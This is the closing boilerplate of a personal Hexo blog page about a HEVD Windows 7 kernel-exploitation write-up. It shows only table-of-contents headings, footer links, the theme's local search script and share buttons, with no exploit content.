href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-%E6%9C%AA%E5%AE%8C%E6%88%90"><span class="toc-text">EXP(未完成)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-TriggerUninitializedMemoryPagedPool"><span class="toc-text">11.TriggerUninitializedMemoryPagedPool</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-text">前置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-6"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-3"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-5"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#12-TriggerDoubleFetch"><span class="toc-text">12.TriggerDoubleFetch</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-7"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-6"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TIPS"><span class="toc-text">TIPS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        







      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/Ghostasky">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
        <li>
          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/ghostasky">
            <i class="iconfont icon-twitter"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/Ghostasky">怕什么真理无穷，进一寸有进一寸的欢喜。</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="Search...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + HEVD-Windows7x86%20SP1%20%E8%AE%B0%E5%BD%95 + '&url=' + https%3A%2F%2Fghostasky.github.io%2F2023%2F08%2F12%2F2023-8-HEVD%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://ghostasky.github.io/2023/08/12/2023-8-HEVD/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
